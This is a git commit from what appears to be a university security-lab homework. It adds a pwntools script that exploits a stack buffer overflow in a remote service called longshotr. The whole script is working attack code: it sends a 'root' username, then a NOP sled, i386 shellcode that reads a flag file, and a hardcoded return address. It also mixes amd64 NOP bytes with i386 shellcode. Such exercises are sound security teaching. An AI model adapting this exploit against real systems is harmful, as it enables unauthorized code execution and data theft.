f9d8a3378d26aace1a0f9a480b91c70c956a0e2b
team23 <team23@host-10-33.seclab.cs.ucsb.edu>
2018-11-24 04:11:58 +0000

    my message

---
+++ HW3/longshotr.py
@@ -0,0 +1,32 @@
+from pwn import *
+from sys import argv
+import time
+
+def longshotr(IPaddr, port):
+    #taking away unnecessary print from pwntools
+    context.log_level = "error"
+    #connect to longshotr
+    r = remote(IPaddr, int(port))
+    #info: -8112h = 33042
+    buffer_len = 33042
+    #craft shell with command cat flag
+    catflag = shellcraft.i386.linux.cat('flag')
+    shellcode = asm(catflag)
+
+    nop = pwnlib.shellcraft.amd64.nop()
+    asmnop = asm(nop)
+
+    shellcode_len = len(shellcode)
+    nopsled = asmnop * (buffer_len - shellcode_len + 4)
+    ret_addr = "\x20\xa4\x04\x08"
+
+    username = "root\0"
+
+    r.send(username+ '\n')
+    #r.send(payload + '\n')
+    data2 = r.recvuntil("analyzed:")
+    #print data2
+    r.send(nopsled + shellcode + ret_addr + '\n')
+    data3 = r.recvall()
+    print data3
+longshotr(argv[1],argv[2])
